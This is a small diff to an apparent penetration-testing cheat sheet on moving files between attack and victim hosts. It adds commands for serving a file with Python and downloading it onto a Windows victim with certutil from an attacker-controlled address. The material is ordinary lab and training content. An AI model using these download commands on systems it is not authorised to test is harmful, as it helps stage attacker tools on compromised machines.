@@ -12,6 +12,10 @@
 ### From Attack host to Victim host (Windows)
 * python web server + powershell iwr
 * python web server + certutil
+<pre>
+$ python -m http.server 8000
+C:\> certutil -urlcache -split -f http://10.10.10.2:8000/file.txt
+</pre>
 ### From Victim host (Linux) to Attack host
 * python web server + wget
 ### From Victim host (Windows) to Attack host
